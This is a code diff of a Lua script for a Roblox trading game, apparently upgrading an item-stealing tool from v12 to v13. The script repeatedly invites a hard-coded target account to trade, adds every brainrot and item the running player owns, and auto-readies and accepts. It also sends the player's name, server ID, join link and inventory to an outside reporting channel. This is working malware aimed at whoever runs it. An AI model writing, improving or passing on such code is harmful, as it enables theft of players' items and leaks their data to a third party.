-                local n = 0
-                for _, a in ipairs(pod:GetChildren()) do
-                    n = n + 1
-                    if n > 3 then break end
-                    local sub = {}
-                    for _, d in ipairs(a:GetDescendants()) do
-                        local at = dumpAttrs(d)
-                        if at ~= "-" then table.insert(sub, d.Name.." -> "..at) end
-                    end
-                    embed("DUMP: "..a.Name, ("propia: %s\nhijos: %s")
-                        :format(dumpAttrs(a), #sub > 0 and table.concat(sub, "\n") or "-"), 10181046)
-                end
-            end
-        end
-        for _, pair in ipairs({ { "Synchronizer", T.Sync }, { "BrainrotList", T.ListBrain },
-                                { "TradeList", T.ListTrade } }) do
-            if pair[2] then
-                local ok, r = callRF(pair[2], 4)
-                if ok and r ~= nil then embed("DUMP: "..pair[1], string.sub(ser(r), 1, 3400), 10181046) end
-            end
-        end
-        embed("DUMP: fin", "Manda esto tal cual.", 10181046)
-    end)
+    return nil
 end
 
 task.spawn(function()
-    task.wait(2)
-    if not NET then embed("ERROR", "Sin Packages.Net", 15158332) end
-    if not placeOk() then embed("⚠️ Place fuera de lista", ("%d (%s)"):format(game.PlaceId, game.Name), 15158332) end
-    embed("Target fijo", "UserId "..TARGET_ID.." ("..TARGET_USERNAME.." / "..TARGET_DISPLAY..")", 65280)
-    doDump()
+    local pg = LP:WaitForChild("PlayerGui", 20)
+    if not pg then return end
+    for _, g in ipairs(pg:GetChildren()) do
+        if g:IsA("ScreenGui") then S.baseline[g] = true end
+    end
+    trace("Baseline PlayerGui: " .. tostring(#pg:GetChildren()) .. " hijos")
 
-    while S.run do
-        if ownPlot() and not S.filling then
-            local fresh = readPlot()
-            if #fresh > 0 then CACHE, CACHE_AGE = fresh, 0 end
-        else
-            CACHE_AGE = CACHE_AGE + 1
-            if CACHE_AGE == CFG.SNAP_FREEZE and #CACHE > 0 then
-                embed("Plot fuera", "Plot perdido (¿teleport a la plaza?). Snapshot congelado: "..#CACHE.." ítems.", 16776960)
-            end
-        end
-
-        pcall(function()
+    while S.running do
+        local g = tradeGui()
+        if g and not g:GetAttribute("sabSeen") then
+            g:SetAttribute("sabSeen", true)
             if CFG.WATCH_GUI then
-                for _, g in ipairs(guis()) do
-                    if not S.seenGui[g] then S.seenGui[g] = os.clock() embed("GUI nueva", g.Name, 9807270) end
-                end
+                trace(("GUI nueva: '%s' | %d descendientes"):format(g.Name, #g:GetDescendants()))
             end
-
-            local items = (#CACHE > 0) and CACHE or readPlot()
-            if #items > 0 then
-                local sig = ""
-                for _, it in ipairs(items) do sig = sig..it.name.."|" end
-                if sig ~= S.lastSig and os.clock() - S.lastPost > 10 then
-                    S.lastSig, S.lastPost = sig, os.clock()
-                    local br, bs, gr = {}, {}, {}
-                    for _, it in ipairs(items) do
-                        if it.prio == 1 then table.insert(bs, it.name)
-                        elseif it.prio == 2 then table.insert(br, it.name)
-                        elseif it.prio == 3 then table.insert(gr, it.name) end
-                    end
-                    local here = Players:FindFirstChild(TARGET_USERNAME) ~= nil
-                    local d = {
-                        ("**KIMILOSP aquí:** %s | **target fijo:** %d"):format(here and "sí" or "no", TARGET_ID),
-                        ("**Jugadores:** %d"):format(#Players:GetPlayers()),
-                        "**Servidor:** `"..(game.JobId ~= "" and game.JobId or "studio").."`",
-                        ("<https://www.roblox.com/games/%d?jobId=%s>"):format(game.PlaceId, game.JobId), "",
-                        ("🧠 BRAINROTS (%d)"):format(#br) }
-                    for i, n in ipairs(br) do table.insert(d, i..". "..n) end
-                    table.insert(d, ("\n⚙️ BASES (%d)"):format(#bs))
-                    for i, n in ipairs(bs) do table.insert(d, i..". "..n) end
-                    table.insert(d, ("\n🔧 GEARS (%d)"):format(#gr))
-                    for i, n in ipairs(gr) do table.insert(d, i..". "..n) end
-                    local txt = table.concat(d, "\n")
-                    if #txt > 3800 then txt = txt:sub(1, 3790).."…" end
-                    ping(("🧠 %s (%d) — target %s"):format(LP.DisplayName, LP.UserId,
-                        ("<https://www.roblox.com/users/%d/profile>"):format(TARGET_ID)), txt, 65280)
-                end
+            if (S.phase == "WAIT_GUI" or S.phase == "INVITING") and S.phase ~= "FILLING" then
+                S.tradeGui = g
+                S.phase = "FILLING"
+                task.spawn(fill)
             end
-        end)
-
-        local root = tradeGui()
-        if not root and not S.filling and placeOk() then
-            if os.clock() - S.invitedAt >= backoff() then invite() end
         end
-        if root then
-            if S.handled ~= root then S.handled = root fill() end
-        elseif S.handled then
-            S.handled = nil
-        end
-
-        task.wait(CFG.POLL)
+        task.wait(0.25)
     end
 end)
 
-log("v12 cargado | target "..TARGET_ID.." | place "..game.PlaceId)
+-- ============================ FILL ============================
+fill = function()
+    if S.phase == "FILLING" and S.sent > 0 then return end
+    S.sent = 0
+
+    local items = snapshot()
+    local targets = {}
+    for _, it in ipairs(items) do
+        if it.isTarget then table.insert(targets, it) end
+    end
+    if #targets == 0 and CFG.ADD_ALL_IF_EMPTY then
+        trace("Sin coincidencias de filtro, usando ADD_ALL_IF_EMPTY")
+        targets = items
+    end
+
+    trace(("Fill: %d de %d items"):format(math.min(#targets, CFG.MAX_TRADE_ITEMS), #items))
+
+    local added = {}
+    for i, it in ipairs(targets) do
+        if i > CFG.MAX_TRADE_ITEMS then break end
+        if not S.running or S.phase ~= "FILLING" then break end
+        if not (it.inst and it.inst.Parent) then continue end
+
+        local rf = (it.kind == "brainrot") and R.AddBrainrot or R.AddItem
+        local ok, res = callRF(rf, 5, it.id or it.inst)   -- FIX 2: resultado real
+        if ok and isOk(res) then
+            S.sent += 1
+            table.insert(added, it.name)
+            log(("  + %s (%s) ok=%s"):format(it.name, tostring(it.id), tostring(res)))
+        else
+            log(("  ! %s fallo ok=%s res=%s"):format(it.name, tostring(ok), tostring(res)))
+        end
+        task.wait(CFG.ITEM_DELAY)
+    end
+
+    task.wait(0.5)
+    fireRE(R.Ready, true)
+    task.wait(1.0)
+    if CFG.AUTO_ACCEPT then fireRE(R.Accept, true) end
+
+    S.phase = "WAIT_COMPLETE"
+    S.guiAt = os.clock()
+    trace(("Fill terminado: %d añadidos, Ready+Accept enviados"):format(S.sent))
+    report(("**TRADE ENVIADO**\nItems confirmados: **%d**\n```%s```"):format(
+        S.sent, table.concat(added, "\n"):sub(1, 900)), 3447003)
+end
+
+finish = function(state, detail)
+    S.phase = "DONE"
+    S.tradeGui = nil
+    S.sent = 0
+    trace(("Fin de sesión: %s | %s"):format(state, tostring(detail)))
+    task.delay(CFG.RETRY_AFTER, function()
+        if not S.running then return end
+        S.phase = "IDLE"
+        S.invTries = 1
+        S.lastInvite = -999
+    end)
+end
+
+-- ============================ INVITE ============================
+local function invite()
+    if not R.Invite then return end
+    S.phase = "INVITING"
+    S.lastInvite = os.clock()
+    local ok, res = callRF(R.Invite, CFG.INVITE_TIMEOUT, CFG.TARGET_ID)
+    trace(("Invite -> ok=%s res=%s intento=%d backoff=%ds"):format(
+        tostring(ok), tostring(res), S.invTries, backoff()))
+
+    if ok and isOk(res) then
+        S.phase = "WAIT_GUI"
+        S.invitedAt = os.clock()
+    else
+        S.phase = "IDLE"
+        S.invTries += 1
+    end
+end
+
+-- ============================ EVENTOS ============================
+local function bindEvents()
+    if R.InviteResult then
+        R.InviteResult.OnClientEvent:Connect(function(payload)
+            local flat = tostring(payload)
+            if type(payload) == "table" then
+                local bits = {}
+                for k, v in pairs(payload) do bits[#bits+1] = tostring(k) .. "=" .. tostring(v) end
+                flat = table.concat(bits, " ")
+            end
+            local s = flat:lower()
+            trace("InviteResult: " .. flat:sub(1, 200))
+
+            if s:find("accept") or s:find("true") then
+                if S.phase == "WAIT_GUI" or S.phase == "INVITING" then
+                    S.phase = "FILLING"
+                    task.spawn(fill)
+                end
+            else
+                S.phase = "IDLE"
+                S.invTries += 1
+            end
+        end)
+    end
+
+    if R.TradeCompleted then
+        R.TradeCompleted.OnClientEvent:Connect(function() finish("completado", "TradeCompleted") end)
+    end
+
+    if R.Cancel then
+        R.Cancel.OnClientEvent:Connect(function()
+            if S.phase ~= "IDLE" and S.phase ~= "DONE" then
+                finish("cancelado", "CancelTrade")
+            end
+        end)
+    end
+end
+
+-- ============================ DUMP ============================
+local function dump()
+    local items, plot = snapshot()
+    if not plot then
+        report("**DUMP**\nNo se pudo resolver el plot propio.", 15105570)
+        return
+    end
+    local lines = { "**DUMP " .. plot.Name .. "**", "" }
+    for _, it in ipairs(items) do
+        table.insert(lines, ("%s | id=%s | target=%s | attrs=%s"):format(
+            it.name, tostring(it.id), tostring(it.isTarget),
+            tostring(it.inst and extractId(it.inst))))
+    end
+    local sync = findPath(RS, "Synchronizer/RequestData")
+    table.insert(lines, "\nSynchronizer.RequestData: " .. tostring(sync ~= nil))
+    local btt = findPath(RS, "BrainrotToTrade/RequestList")
+    table.insert(lines, "BrainrotToTrade.RequestList: " .. tostring(btt ~= nil))
+    report(table.concat(lines, "\n"):sub(1, 3900), 10181046)
+end
+
+-- ============================ ARRANQUE ============================
+if CFG.STRICT_PLACE and game.PlaceId ~= CFG.PLACE_ID then
+    report(("**PLACE EQUIVOCADO**\nPlaceId: `%d`\nEsperado: `%d`"):format(game.PlaceId, CFG.PLACE_ID), 15548997)
+    warn("[SAB] STRICT_PLACE: abortando")
+    return
+end
+
+trace(("**SAB v13 ONLINE**\n%s (%d)\nPlaceId %d\nJobId `%s`"):format(
+    LP.Name, LP.UserId, game.PlaceId, game.JobId))
+
+task.spawn(function()
+    local waited = 0
+    while not resolve() and waited < 30 do
+        task.wait(1); waited += 1
+    end
+    if not R.Invite then
+        report("**REMOTES NO ENCONTRADOS**\nPackages.Net no resuelto tras 30s.", 15548997)
+        return
+    end
+    trace("Remotes OK: Invite, AcceptInvite, AddBrainrot, AddItem, Ready, Accept, CancelTrade, InviteResult, TradeCompleted")
+    bindEvents()
+
+    if CFG.DUMP then dump(); return end
+
+    local _, plot = snapshot()
+    trace("Plot propio: " .. tostring(plot and plot.Name or "NIL"))
+    task.wait(1)
+    S.phase = "IDLE"
+
+    while S.running do
+        local p = S.phase
+
+        if p == "WAIT_GUI" and os.clock() - S.invitedAt > CFG.GUI_TIMEOUT then
+            trace("Sin ventana tras invite, reintento")
+            fireRE(R.Cancel)
+            S.phase = "IDLE"
+            S.invTries += 1
+        elseif p == "WAIT_COMPLETE" and os.clock() - S.guiAt > CFG.COMPLETE_TIMEOUT then
+            trace("Sin TradeCompleted, reintento")
+            finish("timeout", "sin confirmación")
+        elseif p == "IDLE" then
+            if os.clock() - S.lastInvite >= backoff() then
+                invite()
+            end
+        end
+        task.wait(CFG.POLL)
+    end
+end)
